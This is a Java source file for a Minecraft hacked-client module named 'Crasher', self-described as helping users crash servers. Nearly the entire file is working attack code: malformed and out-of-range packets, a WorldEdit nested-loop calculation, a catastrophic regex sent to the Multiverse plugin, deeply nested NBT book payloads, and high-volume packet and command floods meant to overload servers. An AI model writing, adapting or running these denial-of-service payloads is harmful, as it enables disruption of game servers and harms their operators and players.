package me.retucio.retclient.features.modules.exploit;

import me.retucio.retclient.features.command.Command;
import me.retucio.retclient.features.modules.Module;
import me.retucio.retclient.features.settings.Setting;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.Random;

import io.netty.buffer.Unpooled;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;

import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtByte;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.common.KeepAliveC2SPacket;

// longest module yet
// TODO: make it useful + add some meteor crash addon crashes, etc.

public class Crasher extends Module {
	
    private final String message = "\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd";
    
    private final Setting<Mode> mode = register(new Setting<>("Mode", Mode.WRITE_BOOK));
    
    private final Setting<Integer> clickBookPages = register(new Setting<>("Pages", 10000, 1, 10000, v -> mode.getValue() == Mode.CLICK_BOOK));
    private final Setting<Integer> clickBookPower = register(new Setting<>("Power", 10000, 1, 10000, v -> mode.getValue() == Mode.CLICK_BOOK));
    
    private final Setting<Integer> writeBookPower = register(new Setting<>("Power", 10000, 1, 10000, v -> mode.getValue() == Mode.WRITE_BOOK));
    
    private final Setting<Integer> giveBookPages = register(new Setting<>("Pages", 10000, 1, 10000, v -> mode.getValue() == Mode.GIVE_BOOK));
    private final Setting<Integer> giveBookPower = register(new Setting<>("Power", 10000, 1, 10000, v -> mode.getValue() == Mode.GIVE_BOOK));

    private final Setting<Integer> swingArmPower = register(new Setting<>("Power", 10000, 1, 10000, v -> mode.getValue() == Mode.SWING_ARM));

    private final Setting<Integer> ignorePower = register(new Setting<>("Power", 10000, 1, 10000, v -> mode.getValue() == Mode.IGNORE));

    private final Setting<Integer> fAddPower = register(new Setting<>("Power", 10000, 1, 10000, v -> mode.getValue() == Mode.FRIEND_ADD));
    
    private final Setting<Integer> popBobPower = register(new Setting<>("Power", 10000, 1, 10000, v -> mode.getValue() == Mode.POPBOB));

    private final Setting<Integer> playerMoveC2SPacketPower = register(new Setting<>("Power", 10000, 1, 10000, v -> mode.getValue() == Mode.PLAYERMOVEC2SPACKET));
    
    
    
    public Crasher() {
    	super("Crasher", "Helps you crash servers", Category.EXPLOIT, true, false, false);
    }

    @Override
    public void onEnable() {

        if (nullCheck()) {
            disable();
            return;
        }
        
    	
    	switch (mode.getValue()) {
    	
    		case Mode.INVALID_PACKET:    
    			mc.player.networkHandler.sendPacket(new CustomPayloadC2SPacket((new PacketByteBuf(Unpooled.buffer())).writeString(message)));
    			break;
    			
    		case Mode.CHUNK_OOB:
    			mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos((int) Double.POSITIVE_INFINITY, 100, (int) Double.POSITIVE_INFINITY), true), 696969696));
                mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos((int) Double.POSITIVE_INFINITY, (int) Double.POSITIVE_INFINITY, (int) Double.POSITIVE_INFINITY), true), 420420420));
    			break;
                
    		case Mode.WORLD_EDIT:
    			mc.player.sendMessage(Text.of("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
    			break;
    			
    		case Mode.MULTIVERSE:
    			mc.player.sendMessage(Text.of("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^"));
    			break;
			
    		case Mode.CLICK_BOOK:
                clickBook();
    			break;
                
    		case Mode.WRITE_BOOK:
    			writeBook();
    			break;
                
    		case Mode.GIVE_BOOK:
    			giveBook();
    			break;
                
    		case Mode.SWING_ARM:
    			swingArm();
    			break;
    		
    		case Mode.IGNORE:
    			ignoreCommand();
    			break;
    			
    		case Mode.FRIEND_ADD:
    			friendAdd();
    			break;
    		
    		case Mode.POPBOB:
    			popBob();
    			break;
    			
			default:
				break;
    	}
    }

    @Override
    public void onTick() {
        try {
        	
        	switch (mode.getValue()) {
        		
        		case Mode.SIGN:
        			
        		    final String color = "red";
        		    
        		    final Text line1 = Text.Serialization.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
        		    final Text line2 = Text.Serialization.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
        		    final Text line3 = Text.Serialization.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
        		    final Text line4 = Text.Serialization.fromJson("{\"text\":\"" + message + "\",\"color\":\"" + color + "\"}");
        			
                    mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(
                    		mc.player.getBlockPos(), true,
                    		line1.getString(), line2.getString(), line3.getString(), line4.getString())
                    );
                
        		case Mode.BOAT_PADDLE:
                    for (int i = 0; i < 100; i++) {
                        mc.player.networkHandler.sendPacket(new BoatPaddleStateC2SPacket(true, true));
                    }
                
        		case Mode.PLAYERMOVEC2SPACKET:
        			for (int i = 0; i < playerMoveC2SPacketPower.getValue(); i++) {
        				mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(Math.random() >= 0.5));
        				mc.player.networkHandler.sendPacket(new KeepAliveC2SPacket((int) (Math.random() * 8)));
        			}
        	}
        	
            Thread.sleep(12L);
        } 
        
        catch(Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getInfo() {
        return mode.getValue().name();
    }

    enum Mode {
    	BOAT_PADDLE("BoatPaddle"),
        SIGN("Sign"),
        INVALID_PACKET("InvalidPacket"),
        CHUNK_OOB("ChunkOOB"),
        WORLD_EDIT("WorldEdit"),
        MULTIVERSE("MultiVerse"),
        CLICK_BOOK("ClickBook"),
        WRITE_BOOK("WriteBook"),
        GIVE_BOOK("GiveBook"),
        SWING_ARM("SwingArm"),
        IGNORE("Ignore"),
        FRIEND_ADD("FriendAdd"),
        POPBOB("PopBob"),
        PLAYERMOVEC2SPACKET("PlayerMoveC2SPacket");

		private String name;

		Mode(String name) {
			this.name = name;
	    }

        public String getName() {
            return this.name;
        }
    }
    
    private void clickBook() {
    	int pages = clickBookPages.getValue();
        int power = clickBookPower.getValue();
        long startTime = System.currentTimeMillis();
        
        new Thread(() -> {
            Command.sendMessage("Crashing with ClickBook method...");
            
            ItemStack payload = new ItemStack(Items.WRITTEN_BOOK);
            NbtList nbtList = new NbtList();
            
            String ztring = "{" + "extra:[{".repeat(Math.max(0, pages)) + "text:\"a\"}],".repeat(Math.max(0, pages)) + "text:\"a\"}";
            nbtList.add(NbtString.of(ztring));
            
            payload.setSubNbt("author", NbtString.of(mc.player.getGameProfile().getName()));
            payload.setSubNbt("title", NbtString.of("ret client on top"));
            payload.setSubNbt("pages", nbtList);
            payload.setSubNbt("resolved", NbtByte.of(true));
            
            Int2ObjectMap<ItemStack> arrayMap = new Int2ObjectArrayMap<>();
            arrayMap.apply(0);
            arrayMap.apply(3);
            arrayMap.apply(0);
            arrayMap.apply(Integer.MAX_VALUE);
            arrayMap.apply(Integer.MIN_VALUE);
            
            for (int i = 0; i < power; i++) {
                mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId, 0, mc.player.getInventory().selectedSlot + 36, 1, SlotActionType.THROW, payload, arrayMap));
            }
            
            Command.sendMessage("Packets sent - (" + (System.currentTimeMillis() - startTime) + ")");
            
        }).start();
    }
    
    private void writeBook() {
        long startTime = System.currentTimeMillis();
        
        List<String> crash = new ArrayList<>();
        
        int j = writeBookPower.getValue().intValue();
        for (int i = 0; i < j; i++) {
            crash.add(".");
        }
        
        Optional<String> bookTitle = Optional.empty();
        mc.player.networkHandler.sendPacket(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, crash, bookTitle));
        
        Command.sendMessage("Packets Sent - (" + (System.currentTimeMillis() - startTime) + ")");
    }
    
    private void giveBook() {
		int pages = giveBookPages.getValue();
        int power = giveBookPower.getValue();
        long startTime = System.currentTimeMillis();
        NbtList list = new NbtList();
        
        new Thread(() -> {
            Command.sendMessage("Crashing with GiveBook method");
            ItemStack payload = new ItemStack(Items.WRITTEN_BOOK);
            StringBuilder f = new StringBuilder();
            
            f.append("{");
            f.append("extra:[{".repeat(Math.max(0, pages)));
            f.append("text:\"+\"}],".repeat(Math.max(0, pages)));
            f.append("text:\"+\"}");
            
            for (int i = 0; i < pages / 16; i++) {
                list.add(NbtString.of(f.toString()));
            }
            
            payload.setSubNbt("author", NbtString.of(mc.player.getGameProfile().getName()));
            payload.setSubNbt("title", NbtString.of("Ret Client on top"));
            payload.setSubNbt("pages", list);
            payload.setSubNbt("resolved", NbtByte.of(true));
            
            for (int i = 0; i < power; i++) {
                mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(100, payload));
                
                try {
                    Thread.sleep(0);
                } 
                
                catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            
            Command.sendMessage("Packets Sent - (" + (System.currentTimeMillis() - startTime) + ")");
            
        }).start();
    }
    
    private void swingArm() {
        int power = swingArmPower.getValue();
        long startTime = System.currentTimeMillis();
        
        new Thread(() -> {
            for (int i = 0; i < power * 10; i++) {
                mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                
                try {
                    Thread.sleep(0);
                } 
                
                catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            
            Command.sendMessage("Packets Sent - (" + (System.currentTimeMillis() - startTime) + ")");
            
        }).start();
    }
    
    private void ignoreCommand() {
        int power = ignorePower.getValue();
        long startTime = System.currentTimeMillis();

        new Thread(() -> {
            for (int i = 0; i < power * 10; i++) {
                mc.player.sendMessage(Text.of("/ignore 69696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969"));
                
                try {
                    Thread.sleep(500);
                } 
                
                catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            
            Command.sendMessage("Packets Sent - (" + (System.currentTimeMillis() - startTime) + ")");
        
        }).start();
    }
    
    private void friendAdd() {
    	int power = fAddPower.getValue();
    	long startTime = System.currentTimeMillis();
    	
        new Thread(() -> {
            for (int i = 0; i < power * 10; i++) {
                mc.player.sendMessage(Text.of("/f add 69696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969696969"));
                
                try {
                    Thread.sleep(500);
                } 
                
                catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            
            Command.sendMessage("Packets Sent - (" + (System.currentTimeMillis() - startTime) + ")");
            
        }).start();
    }
    
    private void popBob() {
    	int power = popBobPower.getValue();
    	long startTime = System.currentTimeMillis();
    	
        new Thread(() -> {
            Random random = new Random();
            
            for (int j = 0; j < 100; j++) {
                for (int i = 0; i < power; i++) {
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(random.nextBoolean()));
                    
                    try {
                        Thread.sleep(0);
                    } 
                    
                    catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                
                try {
                    Thread.sleep(200);
                } 
                
                catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            
            Command.sendMessage("Packets Sent - (" + (System.currentTimeMillis() - startTime) + ")");
            
        }).start();
    }
    
    
}